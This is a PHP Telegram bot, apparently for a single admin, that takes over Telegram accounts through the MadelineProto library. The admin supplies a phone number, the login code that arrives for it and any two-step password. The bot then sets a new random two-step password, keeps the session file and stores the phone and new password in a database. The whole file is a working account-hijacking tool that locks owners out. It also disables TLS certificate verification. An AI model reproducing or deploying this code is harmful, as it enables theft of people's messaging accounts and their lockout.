<?php
// bot.php - نسخة Render
require __DIR__ . '/madeline.php';
require __DIR__ . '/config.php';

use danog\MadelineProto\API;
use danog\MadelineProto\Settings\AppInfo;
use danog\MadelineProto\Settings;

$db = new PDO('sqlite:' . DB_PATH);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec("
CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT UNIQUE, session_file TEXT, password TEXT);
CREATE TABLE IF NOT EXISTS activation_sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, admin_id INTEGER, step TEXT, temp_file TEXT, phone TEXT);
");

function botApi($method, $params) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

function sendMessage($chat_id, $text) {
    botApi('sendMessage', ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML']);
}

$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

$message = $update['message'] ?? null;
$chat_id = $message['chat']['id'] ?? 0;
$user_id = $message['from']['id'] ?? 0;
$text = trim($message['text'] ?? '');

if ($user_id != ADMIN_ID) { sendMessage($chat_id, "غير مصرح"); exit; }

if ($text === '/start') {
    sendMessage($chat_id, "مرحبًا! أرسل رقم الهاتف مع المفتاح: +967XXXXXXXX");
    exit;
}

$stmt = $db->prepare("SELECT * FROM activation_sessions WHERE admin_id = ? AND step != 'completed' ORDER BY id DESC LIMIT 1");
$stmt->execute([$user_id]);
$session = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$session && preg_match('/^\+\d+$/', $text)) {
    $tempFile = '/tmp/temp_' . uniqid();
    $settings = new Settings();
    (new AppInfo())->setApiId(API_ID)->setApiHash(API_HASH);
    $mad = new API($tempFile, $settings);
    $mad->phoneLogin($text);
    $db->prepare("INSERT INTO activation_sessions (admin_id, step, temp_file, phone) VALUES (?, 'awaiting_code', ?, ?)")->execute([$user_id, $tempFile, $text]);
    sendMessage($chat_id, "✅ تم إرسال الكود. أرسله الآن:");
    exit;
}
elseif ($session && $session['step'] === 'awaiting_code' && is_numeric($text)) {
    $settings = new Settings();
    (new AppInfo())->setApiId(API_ID)->setApiHash(API_HASH);
    $mad = new API($session['temp_file'], $settings);
    try {
        $authorization = $mad->completePhoneLogin($text);
        if ($authorization['_'] === 'account.password') {
            $db->prepare("UPDATE activation_sessions SET step = 'awaiting_password' WHERE id = ?")->execute([$session['id']]);
            sendMessage($chat_id, "🔐 يتطلب كلمة مرور خطوتين. أرسلها:");
            exit;
        }
        $newPass = bin2hex(random_bytes(8));
        try { $mad->update2fa(['password' => $newPass]); } catch (Exception $e) {}
        $finalSession = '/tmp/' . md5($session['phone']) . '.madeline';
        copy($session['temp_file'], $finalSession);
        unlink($session['temp_file']);
        $db->prepare("INSERT INTO accounts (phone, session_file, password) VALUES (?, ?, ?)")->execute([$session['phone'], $finalSession, $newPass]);
        $db->prepare("DELETE FROM activation_sessions WHERE id = ?")->execute([$session['id']]);
        sendMessage($chat_id, "🎉 تم التخزين بنجاح! كلمة المرور الجديدة: $newPass");
    } catch (Exception $e) {
        sendMessage($chat_id, "❌ فشل: " . $e->getMessage());
    }
    exit;
}
elseif ($session && $session['step'] === 'awaiting_password') {
    $settings = new Settings();
    (new AppInfo())->setApiId(API_ID)->setApiHash(API_HASH);
    $mad = new API($session['temp_file'], $settings);
    try {
        $mad->complete2faLogin($text);
        $newPass = bin2hex(random_bytes(8));
        try { $mad->update2fa(['password' => $newPass]); } catch (Exception $e) {}
        $finalSession = '/tmp/' . md5($session['phone']) . '.madeline';
        copy($session['temp_file'], $finalSession);
        unlink($session['temp_file']);
        $db->prepare("INSERT INTO accounts (phone, session_file, password) VALUES (?, ?, ?)")->execute([$session['phone'], $finalSession, $newPass]);
        $db->prepare("DELETE FROM activation_sessions WHERE id = ?")->execute([$session['id']]);
        sendMessage($chat_id, "🎉 تم التخزين بنجاح! كلمة المرور الجديدة: $newPass");
    } catch (Exception $e) {
        sendMessage($chat_id, "❌ كلمة المرور خاطئة: " . $e->getMessage());
    }
    exit;
}
else {
    sendMessage($chat_id, "⚠️ أرسل /start للبدء");
}
?>